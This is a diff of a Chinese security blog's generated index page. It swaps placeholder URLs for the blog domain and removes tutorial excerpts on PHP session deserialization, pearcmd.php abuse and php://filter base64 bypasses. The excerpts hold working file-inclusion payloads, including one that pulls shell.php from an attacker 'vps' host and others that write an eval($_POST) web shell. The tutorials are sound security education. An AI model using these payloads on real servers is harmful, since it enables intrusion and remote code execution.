@@ -5,12 +5,12 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://example.com">
+  <link rel="dns-prefetch" href="https://blog.warrenli.fun">
   <title>Warrenli&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="Warrenli&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:url" content="https://blog.warrenli.fun/index.html">
 <meta property="og:site_name" content="Warrenli&#39;s blog">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="Warrenli">
@@ -141,660 +141,28 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-php session 反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="三种处理器"><a href="#三种处理器" class="headerlink" title="三种处理器"></a>三种处理器</h2><h3 id="php-处理器"><a href="#php-处理器" class="headerlink" title="php 处理器"></a>php 处理器</h3><p>首先来看看<code>session.serialize_handler</code>等于 <code>php</code>时候的序列化结果，demo 如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>序列化的结果为：<code>session|s:7:&quot;xianzhi&quot;;</code></p>
-<p><code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值</p>
-<h3 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h3><p>最后就是<code>session.serialize_handler</code>等于 <code>php_serialize</code>时候的序列化结果，同理，demo 如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>序列化的结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
-<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
-<h3 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h3><p>再来看看<code>session.serialize_handler</code>等于 <code>php_binary</code>时候的序列化结果。</p>
-<p>demo 如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为<code>#</code>，所以最终的结果如下图所示：</p>
-<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:7:&quot;xianzhi&quot;;</code></p>
-<p><code>#</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:7:&quot;xianzhi&quot;;</code>为传入 GET 参数经过序列化后的值</p>
-<h2 id="php-serialize和php处理器同时开启触发bug"><a href="#php-serialize和php处理器同时开启触发bug" class="headerlink" title="php_serialize和php处理器同时开启触发bug"></a>php_serialize和php处理器同时开启触发bug</h2><p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | 。</p>
-<p>再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
-<p>举个简单的例子：</p>
-<p>定义一个<code>session.php</code>文件，用于传入 <code>session</code>值，文件内容如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>先看看<code>session</code>的初始内容，如下：</p>
-<p><code>a:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;</code></p>
-<p>存在另一个<code>class.php</code> 文件，内容如下：</p>
-<p>实例化对象后，输出了<code>panda</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">  ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">  session_start();</span><br><span class="line">    class XianZhi&#123;</span><br><span class="line">    public $name = &#x27;panda&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $str = new XianZhi();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293287048-b53226f8-e683-4042-925a-5f6bc03b906e.png"></p>
-<p>这两个文件的作用很清晰，<code>session.php</code>文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的 <code>session</code>值，<code>class.php</code>文件的作用是在反序列化开始前输出<code>Who are you?</code>，反序列化结束的时候输出<code>name</code>值。</p>
-<p>这两个文件如果想要利用，我们要在<code>session.php</code>文件传入<code>|</code>+<code>序列化</code>格式的值，然后再次访问<code>class.php</code>文件的时候，就会在调用<code>session</code>值的时候，触发此 BUG。</p>
-<p>首先生成序列化字符串，利用 payload 如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XianZhi&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $str = new XianZhi();</span><br><span class="line">    $str-&gt;name = &quot;xianzhi&quot;;</span><br><span class="line">    echo serialize($str);</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293514891-7e51d58b-beaa-4d7b-9211-737acdaa7607.png"></p>
-<p>payload：<code>O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
-<p>然后传入<code>session.php</code>：</p>
-<p><img src="/2025/03/26/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293526124-e212be59-1a8e-410b-bdc1-4f87cb9de90c.png"></p>
-<p>此时的 <code>session</code>内容如下：</p>
-<p><code>a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;</code></p>
-<p>再次访问<code>class.php</code>文件的时候：</p>
-<p><img src="/2025/03/26/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293541065-1ccc3614-0831-471b-b826-b5f5082caab1.png"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pearcmd.php的妙用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</p>
-<p>这个register_argc_argv能干什么呢？</p>
-<p>简言之，可以通过$_SERVER[‘argv’]&#96;获得命令行参数，其中</p>
-<p>test.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>测试</p>
-<p><img src="/2025/03/26/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513208-5dbf7551-dbd2-47d9-a6db-9373b359bb89.png"></p>
-<p>多个参数</p>
-<p><img src="/2025/03/26/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513259-0f749338-88eb-40a0-b07f-9186dcdf806c.png"></p>
-<h4 id="WEB模式中"><a href="#WEB模式中" class="headerlink" title="WEB模式中"></a>WEB模式中</h4><p><img src="/2025/03/26/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513224-bdcb1900-0357-4a3b-9666-c17170ebd4c2.png"></p>
-<p>注意其中是用+作为分隔符的，不是&amp;</p>
-<h4 id="简单的利用"><a href="#简单的利用" class="headerlink" title="简单的利用"></a>简单的利用</h4><p>修改test.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>[<span class="number">0</span>](<span class="variable">$a</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513306-b2c77e30-5670-48f5-acdf-f1248d3ad585.png"></p>
-<h3 id="2-pearcmd-php的神奇使用"><a href="#2-pearcmd-php的神奇使用" class="headerlink" title="2. pearcmd.php的神奇使用"></a>2. pearcmd.php的神奇使用</h3><p><img src="/2025/03/26/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513486-5862c46e-85ba-4251-bae4-09904d58c5b0.png"></p>
-<p>文件位置：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php</p>
-<p>pear可以用来拉取远程的代码（注意：如果是php代码的话，注意不要被解析，下面举个例子）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http:<span class="comment">//vps/shell.php</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="3-register-argc-argv和pear的关系"><a href="#3-register-argc-argv和pear的关系" class="headerlink" title="3. register_argc_argv和pear的关系"></a>3. register_argc_argv和pear的关系</h3><p>pear文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first find which PHP binary to use</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  PHP=<span class="string">&quot;<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/bin/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/share/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    INCDIR=`dirname $<span class="number">0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/share/php&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/share/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec <span class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=<span class="number">1</span> -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=<span class="number">0</span> -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;$@&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>需要注意的是：当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。</strong></p>
-<h3 id="4-payload"><a href="#4-payload" class="headerlink" title="4. payload"></a>4. payload</h3><h4 id="靶机可出网"><a href="#靶机可出网" class="headerlink" title="靶机可出网"></a>靶机可出网</h4><p>靶机test.php如下，需要拉取远程服务器的shell.php到靶机的&#x2F;tmp目录下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>使用的payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test.php?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574514486-0ff8d4d1-dbc0-44bb-9d0e-08b6689165f2.png"></p>
-<p>然后文件包含&#x2F;tmp&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;shell.php同时传参<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>即可</p>
-<h4 id="靶机不可出网时"><a href="#靶机不可出网时" class="headerlink" title="靶机不可出网时"></a>靶机不可出网时</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php?+config-create+/&amp;file=/usr/share/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure>
-
-<p>如果是post传的file：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span>+/<span class="keyword">var</span>/www/html/a.php </span><br><span class="line"></span><br><span class="line">file=file:<span class="comment">///usr/local/lib/php/pearcmd.php</span></span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-phpfilter死亡绕过---base64过滤字符" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="核心思路—构造垃圾字符，base64过滤掉"><a href="#核心思路—构造垃圾字符，base64过滤掉" class="headerlink" title="核心思路—构造垃圾字符，base64过滤掉"></a>核心思路—构造垃圾字符，base64过滤掉</h3><h3 id="base64特性介绍"><a href="#base64特性介绍" class="headerlink" title="base64特性介绍"></a>base64特性介绍</h3><p>base64解码时候会去掉非其码表中的字符</p>
-<p>编码时简单来说是遵循3变4原则，缺就补&#x3D;</p>
-<p>例如：</p>
-<blockquote>
-<p>chu012345一次编码之后：Y2h1MDEyMzQ1</p>
-<p>两次编码之后：WTJoMU1ERXlNelEx  </p>
-<p>&#x2F;&#x2F;此时我们在WTJoMU1ERXlNelEx前面加上字符串1aji，变成如下字符</p>
-<p>lajiWTJoMU1ERXlNelEx</p>
-</blockquote>
-<p>此时我们进行两次base64解码，结果如下：</p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741588367334-5875a595-06b0-482d-be57-4d3f29064014.png"></p>
-<p>可以发现，我们成功剔除了laji这一段干扰字符，关于字符串的补位也需要根据垃圾字符的解码结果而定，若垃圾字符的解码结果依然包含码表字符，则也需要对码表字符进行处理。</p>
-<h3 id="构造乱码"><a href="#构造乱码" class="headerlink" title="构造乱码"></a>构造乱码</h3><p>利用utf-8，utf-16le构造乱码</p>
-<p>utf-8 –&gt;utf-16le:</p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741590104142-497b8a2b-8b14-4caa-a0ed-3ef15a4cd8ae.png"></p>
-<p>观察上述代码，我们可以发现将编码格式转换之后，字符的长度增加了6，这是因为在utf-8转换为utf-16le的时候会在每一个字符后边增加一个不可见字符</p>
-<p>utf-l6le –&gt; utf-8:</p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741590083149-777a87dd-534b-457f-9ebd-1f2cc9bda69d.png"></p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741590056771-f26686ed-e9d1-4d5f-9707-bd796dc0e1ba.png"></p>
-<p>再查看这段代码运行结果，我们就可以得到，在utf-16le编码转换为utf-8编码的时候，增加了\0这个不可见字符，再反解码的时候，只有带有\0的字符才会被转换，没有\0的就会被转换为乱码，至此，我们就可以成功构造乱码哩</p>
-<p>举例：</p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741591065494-4ea93d79-41fa-4655-8f58-0d016dcb0230.png"></p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741591081503-7f5d3d60-2109-4875-a945-c79af9d93d28.png"></p>
-<h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><ol>
-<li>convert.base64</li>
-</ol>
-<p><code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
-<ol start="2">
-<li>convert.quoted</li>
-</ol>
-<blockquote>
-<p><font style="color:rgb(44, 44, 54);">这种编码方法允许数据以一种几乎完全由可打印ASCII字符组成的格式进行传输，同时尽量保持数据的原始形式。</font></p>
-<p><font style="color:rgb(44, 44, 54);"></font></p>
-<p><font style="color:rgb(44, 44, 54);">Quoted-Printable 编码规则相对简单：</font></p>
-<p><font style="color:rgb(44, 44, 54);">大多数可打印的ASCII字符（除了等号 &#x3D; 和空白字符）保持不变。</font></p>
-<p><font style="color:rgb(44, 44, 54);">空白字符（如空格和制表符）在行尾时会被编码，以防它们在邮件传输过程中被修改或丢失。</font></p>
-<p><font style="color:rgb(44, 44, 54);">所有非ASCII字符以及一些特定的ASCII字符（如等号 &#x3D;）会被编码为 &#x3D;XX 的形式，其中 XX 是该字符的十六进制ASCII值2。</font></p>
-</blockquote>
-<p><code>convert.quoted-printable-encode</code>和<code>convert.quoted-printable-decode</code>使用此过滤器的<code>decode</code>版本等同于用 <code>quoted_printable_decode()</code>函数处理所有的流数据。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 假设这是从邮件中接收到的 Quoted-Printable 编码的字符串</span></span><br><span class="line">  <span class="variable">$encodedStr</span> = <span class="string">&quot;I=0Alove=0AShanghai!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对字符串进行解码</span></span><br><span class="line"><span class="variable">$decodedStr</span> = <span class="title function_ invoke__">quoted_printable_decode</span>(<span class="variable">$encodedStr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出解码后的字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decodedStr</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I</span><br><span class="line">love</span><br><span class="line">Shanghai!</span><br></pre></td></tr></table></figure>
-
-
-
-<ol start="3">
-<li>convert.iconv.*</li>
-</ol>
-<p>这个过滤器需要<code>php</code>支持 <code>iconv</code> ，而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
-<p><code>iconv</code> — 字符串按要求的字符编码来转换</p>
-<p>convery.iconv.*的使用有两种方法:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
-
-<p>支持的字符编码有一下几种（详细参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-<span class="number">4</span>*</span><br><span class="line">UCS-<span class="number">4</span>BE</span><br><span class="line">UCS-<span class="number">4</span>LE*</span><br><span class="line">UCS-<span class="number">2</span></span><br><span class="line">UCS-<span class="number">2</span>BE</span><br><span class="line">UCS-<span class="number">2</span>LE</span><br><span class="line">UTF-<span class="number">32</span>*</span><br><span class="line">UTF-<span class="number">32</span>BE*</span><br><span class="line">UTF-<span class="number">32</span>LE*</span><br><span class="line">UTF-<span class="number">16</span>*</span><br><span class="line">UTF-<span class="number">16</span>BE*</span><br><span class="line">UTF-<span class="number">16</span>LE*</span><br><span class="line">UTF-<span class="number">7</span></span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-<span class="number">8</span>*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>
-
-
-
-
-
